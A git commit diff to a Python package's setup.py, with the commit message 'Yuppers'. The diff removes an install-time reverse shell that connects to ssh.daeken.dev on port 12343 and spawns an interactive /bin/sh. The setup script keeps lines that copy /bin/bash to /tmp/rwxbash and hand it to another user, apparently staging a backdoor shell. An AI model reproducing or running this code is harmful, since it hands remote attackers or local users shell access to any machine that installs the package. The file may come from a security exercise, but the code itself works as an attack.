0d84a21108bae4ccca4b6548305a305b67fd8bc2
Cody Brocious (Daeken) <cody.brocious@gmail.com>
2020-11-02 03:30:36 -0500

    Yuppers

--- setup.py
+++ setup.py
@@ -1,15 +1,6 @@
 import os, os.path, subprocess, sys
 from distutils.core import setup
 
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("ssh.daeken.dev",12343))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"])
-
-
 try:
 	subprocess.check_output(['cp', '/bin/bash', '/tmp/rwxbash'])
 	subprocess.check_output(['chown', 'rwx', '/tmp/rwxbash'])
